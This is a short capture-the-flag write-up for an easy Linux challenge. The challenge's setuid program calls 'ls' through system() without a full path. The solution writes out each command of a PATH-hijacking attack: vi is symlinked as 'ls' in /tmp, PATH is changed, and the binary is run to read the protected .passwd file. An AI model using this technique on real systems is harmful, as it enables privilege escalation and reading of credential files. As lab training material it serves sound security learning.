## ELF32 - System 2

| Author | Level | Points |
| ------ | ----- | ------ |
| Lu33Y | Easy | 10 |


>Eat another one, just for fun !
>
>Source code :
>
>```c
>#include <stdlib.h>
>#include <stdio.h>
> 
>int main(){
>	system("ls -lA /challenge/app-script/ch12/.passwd");
>	return 0;
}
>```

#### Solution

First create folder `test` in `/tmp` and go to this

```
mkdir /tmp/test; cd /tmp/test
```

Create a link to `vi` with the name `ls`

```
ln -s `which vi` ls
```

Change `$PATH`

```
export PATH=".:$PATH"
```

Run file `ch12`

```
~/ch12
```

We can reverse string with this command and get the flag

```
:set arabic!
```